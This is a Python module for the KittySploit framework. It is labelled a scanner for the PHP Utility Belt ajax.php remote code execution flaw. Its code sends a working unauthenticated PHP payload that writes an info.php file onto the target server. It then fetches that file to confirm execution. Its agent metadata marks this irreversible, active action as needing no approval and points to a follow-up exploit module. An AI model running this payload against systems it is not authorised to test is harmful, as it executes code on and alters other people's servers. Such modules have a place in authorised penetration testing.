#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PHP Utility Belt ajax.php code execution."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHP Utility Belt - ajax.php RCE Detection',
        'description': (
            'Detects PHP Utility Belt RCE by writing info.php via ajax.php code= parameter '
            'and verifying phpinfo() output.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'php', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/multi/http/php_utility_belt_rce'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/39554/',
        ],
    }

    def run(self):
        for base in ('', '/php-utility-belt', '/utility-belt'):
            data = "code=fwrite(fopen('info.php','w'),'<?php echo phpinfo();?>');"
            r = self.http_request(
                method='POST',
                path=f'{base}/ajax.php',
                data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=False,
            )
            if not r or r.status_code != 200:
                continue
            g = self.http_request(method='GET', path=f'{base}/info.php', allow_redirects=False)
            if not g:
                continue
            body = g.text or ''
            if '>phpinfo()<' in body and '>System' in body and '>Configuration File' in body:
                self.set_info(
                    severity='critical',
                    reason='PHP Utility Belt ajax.php RCE',
                    path=f'{base}/ajax.php',
                )
                return True
        return False
